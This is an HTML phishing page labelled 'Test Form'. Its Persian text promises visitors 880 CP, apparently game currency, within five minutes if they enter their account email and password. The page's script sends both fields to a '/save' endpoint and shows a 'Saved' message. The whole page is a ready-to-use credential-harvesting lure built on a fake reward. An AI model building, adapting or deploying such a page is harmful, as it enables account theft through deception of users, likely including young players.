<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">

<style>
body{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
background:#000;
font-family:Arial;
}

.box{
background:#ffd600;
padding:40px;
border-radius:25px;
text-align:center;
}

input,button{
display:block;
width:250px;
padding:15px;
margin:10px;
border-radius:10px;
border:0;
}

button{
background:#000;
color:#ffd600;
font-size:18px;
}
</style>

</head>

<body>

<div class="box">

<h1>Test Form</h1>

<p>
در کادر پایین ایمیل اکانت و رمز اکانت خود را وارد کنید تا ۵ دقیقه دیگر 880 تا سی پی واریز میشود
</p>

<input id="email" placeholder="ایمیل اکانت">

<input id="pass" placeholder="رمز اکانت">

<button onclick="send()">ارسال</button>

<p id="msg"></p>

</div>


<script>

function send(){

fetch("/save",{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
email:document.getElementById("email").value,
password:document.getElementById("pass").value
})
})
.then(()=>{
document.getElementById("msg").innerHTML="ذخیره شد ✅"
})

}

</script>


</body>
</html>
